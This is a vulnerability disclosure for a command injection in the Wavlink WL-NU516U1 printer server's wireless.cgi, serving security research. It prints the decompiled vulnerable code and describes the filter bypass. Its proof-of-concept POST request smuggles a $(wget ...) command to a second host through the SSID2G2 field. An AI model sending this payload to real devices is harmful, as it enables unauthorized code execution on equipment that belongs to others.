# WL-NU516U1 wireless.cgi multi_ssid SSID2G2 Command Injection

Vendor: Wavlink

Product: WL-NU516U1

Version: M16U1_V240425
Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A

Vulnerability: Command Injection

CVE: TBD

## Affected version

Wavlink WL-NU516U1 M16U1_V240425

## Vulnerability details

Wavlink WL-NU516U1 M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi.

When the `page` parameter is set to `multi_ssid`, the function `sub_401D68` is invoked.

The function reads `SSID2G2` from POST data and concatenates it into shell commands:

```c
sprintf(v30, "%s_Touch", v8);  // v8 = SSID2G2
sprintf(v29, "set_bss.sh set 2 \"%s_Touch\" OPEN NONE Admin12345", v30);
system(v29);
sprintf(v29, "set_bss.sh set 6 \"%s_Touch\" OPEN NONE Admin12345", v30);
system(v29);
```

The input filter `sub_4074A0` only blocks backtick and pipe. The `$(cmd)` syntax bypasses the filter.

## Proof of Concept (PoC)

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 106

page=multi_ssid&wifi_multi_ssid=1&SSID2G2=$(wget http://192.168.6.1:6666/ssid2g2)&AuthMethod2=OPEN&EncrypType2=NONE
```
